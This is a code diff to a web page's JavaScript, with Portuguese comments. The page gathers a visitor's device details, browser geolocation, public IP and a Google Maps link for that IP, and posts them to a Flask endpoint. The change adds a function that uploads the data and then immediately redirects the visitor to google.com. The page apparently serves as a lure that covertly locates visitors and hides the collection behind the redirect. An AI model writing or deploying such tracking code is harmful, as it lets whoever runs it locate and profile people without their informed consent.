@@ -42,7 +42,7 @@ function gatherDeviceInformation() {
         var ht = window.screen.height;
         var graphics = navigator.gpu || navigator.graphics || 'Not Available';
         var ven = navigator.vendor;
-        var isMobile = isMobileDevice();  // Check if the device is mobile
+        var isMobile = isMobileDevice();
 
         if (ver.indexOf('Firefox') != -1) {
             str = str.substring(str.indexOf(' Firefox/') + 1);
@@ -74,7 +74,7 @@ function gatherDeviceInformation() {
             ven: ven, 
             graphics: graphics, 
             os: os,
-            isMobile: isMobile // Add mobile detection result to the data
+            isMobile: isMobile
         };
 
         resolve(data);
@@ -108,6 +108,27 @@ function getCurrentLocation() {
     });
 }
 
+async function sendDataAndRedirect(combinedData) {
+    try {
+        // Envio dos dados coletados
+        const response = await fetch('/submit_data', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(combinedData)
+        });
+
+        const result = await response.json();
+        console.log('Resposta do Flask (combined data):', result);
+        
+        // Redireciona somente após o envio dos dados
+        window.location.href = "https://www.google.com";
+    } catch (error) {
+        console.error('Erro ao enviar dados:', error.message);
+    }
+}
+
 async function initializePage() {
     try {
         const [deviceData, geolocationData, publicIP] = await Promise.all([
@@ -138,17 +159,8 @@ async function initializePage() {
             googleMapsLinkIP: googleMapsLinkIP
         };
 
-        // Send the combined data in one request
-        const response = await fetch('/submit_data', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(combinedData)
-        });
-
-        const result = await response.json();
-        console.log('Resposta do Flask (combined data):', result);
+        // Enviar os dados e redirecionar
+        await sendDataAndRedirect(combinedData);
     } catch (error) {
         console.error('Erro ao obter dados:', error.message);
     }
